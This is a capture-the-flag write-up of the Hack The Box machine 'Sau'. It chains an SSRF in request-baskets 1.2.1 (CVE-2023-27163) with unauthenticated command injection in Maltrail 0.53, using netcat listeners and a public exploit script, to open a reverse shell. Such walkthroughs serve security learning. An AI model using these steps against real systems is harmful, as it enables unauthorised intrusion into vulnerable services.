## Enumeration

Let's start off with a basic nmap scan.

```
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB/sau]
└─$ nmap 10.10.11.224                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 15:07 MST
Nmap scan report for 10.10.11.224
Host is up (0.061s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds
```

SSH is probably not our ticket and port 80 is filtered, so 55555 is looking really interesting. Let's take a closer look and see what we have.

### Request Baskets

![Create a new basket](new_basket.png)
Visiting our ip address at port 55555 in a browser shows us a page called Request Baskets, which says it can collect and inspect HTTP requests.

Further investigation shows us that it is powered by request-baskets version 1.2.1. This should be helpful!

![Request Basket version 1.2.1](request_baskets_version.png)

Searching Google for request baskets version 1.2.1 reveals that it is vulnerable to server side request forgery (SSRF), CVE-2023-27163. Maybe we can use this to see what is on port 80?

Let's test it out by starting a netcat listener on our machine and see if we can reach it by creating a new basket.

```
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB/sau]
└─$ nc -lvnp 80
```

In the basket settings, let's configure it to forward the request to our Kali machine's IP address.

Next, let's curl the basket using the URL provided

Success! We are able to receive the request we sent on our netcat listener.

### SSRF

Now that we see how things work and know that it is vulnerable, let's see if we can use it to connect to the mysterious port 80. To do this, let's edit the settings for our basket again and set it to forward port 80 from `http://127.0.0.1` with Proxy Response and Expand Forward Path checked.

Now when we go to the URL for the basket, it gives us a broken looking site. At the bottom, we notice it is running something called Maltrail v 0.53. 

![Maltrail site that is a little broken](maltrail.png)

Google shows us that this version is vulnerable to unauthenticated OS command injection (RCE). I found this Python exploit that should give us a reverse shell. https://github.com/spookier/Maltrail-v0.53-Exploit

To run the exploit, we just need to start a netcat listener (I chose port 9001), then run the exploit passing it our listening IP address and port, along with the url for our basket.

```
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB]
└─$ python3 maltrail.poc.py 10.10.14.6 9001 http://10.10.11.224:55555/ionzxhf
```

![Reverse shell](rev_shell.png)
Hooray! We now have a reverse shell, it looks like we're currently running as the user "puma".
